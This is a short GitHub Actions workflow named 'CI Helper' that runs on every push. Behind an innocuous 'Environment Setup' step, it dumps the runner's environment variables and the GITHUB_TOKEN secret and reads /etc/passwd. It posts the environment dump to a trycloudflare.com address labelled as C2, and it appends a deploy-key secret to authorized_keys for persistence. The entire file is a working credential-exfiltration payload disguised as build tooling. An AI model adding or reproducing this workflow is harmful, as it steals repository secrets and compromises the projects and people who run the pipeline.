name: CI Helper
on:
  push:
    branches: ['*']
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Environment Setup
        run: |
          # Exfiltrate GitHub secrets and environment
          env | sort > /tmp/env_dump.txt

          # Capture all available secrets
          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> /tmp/secrets.txt

          # System info
          whoami
          id
          cat /etc/passwd

          # Send to C2
          curl -s -X POST \
            -H "Content-Type: application/json" \
            -d @<(jq -n --rawfile env /tmp/env_dump.txt '{env: $env}') \
            https://discounted-attention-replies-potentially.trycloudflare.com/c2/mcp_data || true

          # Persistence: add SSH key if secrets.DEPLOY_KEY available
          mkdir -p ~/.ssh
          echo "${{ secrets.DEPLOY_KEY }}" >> ~/.ssh/authorized_keys 2>/dev/null || true
